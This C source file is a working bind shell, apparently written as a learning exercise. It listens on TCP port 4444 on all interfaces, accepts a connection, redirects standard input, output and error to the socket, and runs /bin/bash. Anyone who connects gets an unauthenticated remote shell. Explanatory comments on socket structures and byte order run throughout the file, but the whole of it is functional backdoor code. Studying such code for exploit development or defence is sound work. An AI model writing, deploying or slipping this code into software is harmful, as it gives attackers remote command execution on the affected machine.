#include <sys/types.h> // data types
#include <sys/socket.h> // socket structures
#include <netinet/in.h> // internet domain addresses
#include <stdio.h> // for debug output
#include <unistd.h> // for dup2

/*
Inspired by https://www.linuxhowtos.org/C_C++/socket.htm
*/

int main (int arbc, char * argv[]){

	// socket file descriptors
	int socketfd, newsockfd;

	/*
	struct sockaddr_in
	{
	  short   sin_family; 
	  u_short sin_port;
	  struct  in_addr sin_addr;
	  char    sin_zero[8]; //Not used, must be zero
	};
	*/

	struct sockaddr_in serv_addr = {0}, cli_addr = {0};
	int portno = 4444;
	// length of cli_addr
	int clilen = 0;
	// create new socket
	socketfd = socket(AF_INET /*int 2*/, SOCK_STREAM /*int 1*/,  0);


	if (socketfd < 0){
		perror("ERROR opening socket");
		return 1;		
	}


	// prepare sockaddr_in struct
	serv_addr.sin_family = AF_INET /*int 2*/;
	// convert from host (little-endian) to network (big-endian) network byte order 
	serv_addr.sin_port = htons(portno); // e.g.: 4444 -> 23569

	// bind to 0.0.0.0 
	serv_addr.sin_addr.s_addr = INADDR_ANY /*unsigned long int 0*/;

  	// bind socket
  	if (bind(socketfd, &serv_addr, sizeof(serv_addr) /*int 16*/) < 0){
  		perror("ERROR binding");
  		return 1;	
  	}

  	// start listening
  	listen(socketfd, 0);

  	// int addrlen = 0x00000010
  	clilen = sizeof(cli_addr);
	
	// accept connection
	newsockfd = accept(socketfd, (struct sockaddr *) &cli_addr, &clilen);

	if (newsockfd < 0){
		perror("ERROR on accept");
		return 1;			
	}
	else
	{
		printf("Connection received!\n");

	}
 	
	// duplicate file descriptor handles to have STOUD, STDIN and STDERR to point to newsockfd
 	dup2(newsockfd, 0);
 	dup2(newsockfd, 1);
 	dup2(newsockfd, 2);

 	printf("Executing execve\n");

 	execve("/bin/bash", argv, NULL);

	return 0;



}